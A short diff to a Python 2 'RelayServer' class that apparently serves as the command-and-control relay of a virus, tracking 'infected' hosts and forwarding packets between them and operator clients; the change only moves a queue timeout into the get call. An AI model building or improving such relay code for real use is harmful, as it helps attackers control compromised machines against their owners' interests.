@@ -63,7 +63,7 @@ class RelayServer:
 
     def onVirusConnect(self,client,address):
         print address[0] + " infected!"
-        q = Queue(block=True,timeout=60)
+        q = Queue()
         self.toVirus[address[0]] = (client,q)
         self.sendIPList()
         t = threading.Thread(target=self.receiveFromVirus,args=[client,address])
@@ -88,7 +88,7 @@ class RelayServer:
 
     def onClientConnect(self,client,address):
         print address[0] + " connected!"
-        q = Queue(block=True,timeout=60)
+        q = Queue()
         self.toClient[address[0]] = (client,q)
         self.sendIPList(address)
         t = threading.Thread(target=self.receiveFromClient,args=[client,address])
@@ -124,7 +124,7 @@ class RelayServer:
     def dequeue(self,q,s,t):
         while t.isAlive:
             try:
-                pkt = q.get()
+                pkt = q.get(block=True,timeout=60)
                 pkt.send(s)
             except Empty:
                 pass
